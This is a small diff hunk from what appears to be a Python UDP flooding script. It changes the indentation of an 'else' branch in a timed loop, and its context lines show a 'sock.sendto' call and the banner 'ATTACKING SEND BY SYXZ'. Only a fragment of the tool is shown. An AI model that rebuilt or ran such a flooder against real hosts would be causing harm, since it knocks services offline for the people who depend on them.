@@ -10,7 +10,7 @@ while True:
        while 1:
               if time.time() > timeout:
                   break
-           else:
+             else:
                   pass
 sock.sendto(bytes, (ip, port))
 print (" ( + ) ATTACKING SEND BY SYXZ - ")
